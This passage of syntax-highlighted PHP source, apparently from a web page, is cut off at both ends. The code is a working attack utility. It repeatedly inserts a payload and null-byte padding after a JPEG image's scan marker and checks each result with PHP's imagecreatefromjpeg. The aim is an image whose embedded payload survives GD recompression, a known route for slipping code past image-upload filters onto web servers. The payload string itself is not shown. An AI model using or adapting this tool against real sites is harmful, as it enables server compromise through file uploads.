&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;($pad &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $pad &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1024&lt;/span&gt;; $pad&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nullbytePayloadSize &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $pad;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $dis &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;DataInputStream&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $extraBytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFFD8&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Incorrect SOI marker&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt;((&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;()) &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFF&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $marker &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $size &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;skip&lt;/span&gt;($size);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($marker &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xDA&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $startPos &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStreamTmp &lt;span style="color:#f92672"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, $startPos) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;str_repeat&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\0&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;,$nullbytePayloadSize) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $startPos);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;], $outStreamTmp, &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($extraBytes &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt;((&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;())) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0xFF&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt; &lt;span style="color:#f92672"&gt;!==&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0x00&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $stopPos &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $dis&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;() &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $imageStreamSize &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $stopPos &lt;span style="color:#f92672"&gt;-&lt;/span&gt; $startPos;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, $startPos) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $miniPayload &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;str_repeat&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\0&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;,$nullbytePayloadSize)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $startPos, $imageStreamSize),
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nullbytePayloadSize&lt;span style="color:#f92672"&gt;+&lt;/span&gt;$imageStreamSize&lt;span style="color:#f92672"&gt;-&lt;/span&gt;$extraBytes) &lt;span style="color:#f92672"&gt;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($outStream, $stopPos);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;elseif&lt;/span&gt;($correctImage) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $outStream &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $outStreamTmp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;payload_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;], $outStream)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;payload_&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Something\&amp;#39;s wrong&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;checkImage&lt;/span&gt;($filename, $data, $unlink &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FALSE&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;global&lt;/span&gt; $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;file_put_contents&lt;/span&gt;($filename, $data);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;TRUE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;imagecreatefromjpeg&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($unlink)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;unlink&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;custom_error_handler&lt;/span&gt;($errno, $errstr, $errfile, $errline) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;global&lt;/span&gt; $extraBytes, $correctImage;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $correctImage &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;FALSE&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/(\d+) extraneous bytes before marker/&amp;#39;&lt;/span&gt;, $errstr, $m)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($m[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $extraBytes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;int&lt;/span&gt;)$m[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;DataInputStream&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $binData;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $order;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; $size;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__construct&lt;/span&gt;($filename, $order &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;, $fromString &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;order&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $order;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;$fromString) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;file_exists&lt;/span&gt;($filename) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;is_file&lt;/span&gt;($filename))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;File not exists [&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$filename&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;]&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($filename);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $filename;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;size&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;seek&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; ($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;size&lt;/span&gt; &lt;span style="color:#f92672"&gt;-&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;skip&lt;/span&gt;($skip) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, $skip);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readByte&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;End Of File&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $byte &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($byte);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readShort&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;End Of File&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;);
